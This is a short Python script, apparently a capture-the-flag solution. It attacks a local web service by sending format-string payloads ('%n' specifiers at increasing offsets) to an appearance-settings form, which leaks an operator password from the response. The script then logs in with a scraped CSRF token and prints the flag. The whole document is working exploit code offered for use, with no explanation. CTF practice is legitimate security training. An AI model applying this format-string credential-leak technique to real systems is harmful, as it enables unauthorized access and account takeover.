import os
import re

import requests

url = f"http://127.0.0.1:{os.getenv('PWN_PORT', '18110')}"
s = requests.Session()
headers = {'X-Alice-Check': os.getenv('PWN_CAPTCHA_TEST_TOKEN', '')}

for i in range(1, 129):
    r = s.post(
        f'{url}/settings/appearance',
        headers=headers,
        data={
            'status_line': f'A%{i}$n',
            'node_label': 'x',
            'export_template': 'x',
        },
    )
    m = re.search(r'Результат проверки</h2><pre>A\n([\w-]{32})', r.text)
    if m:
        password = m.group(1)
        break

csrf = re.search(
    r'name="csrf" value="([^"]+)"', s.get(f'{url}/login').text
).group(1)
r = s.post(
    f'{url}/login',
    data={'username': 'operator', 'password': password, 'csrf': csrf},
)
print(re.search(r'nskctf\{[^}]+\}', r.text).group(0))
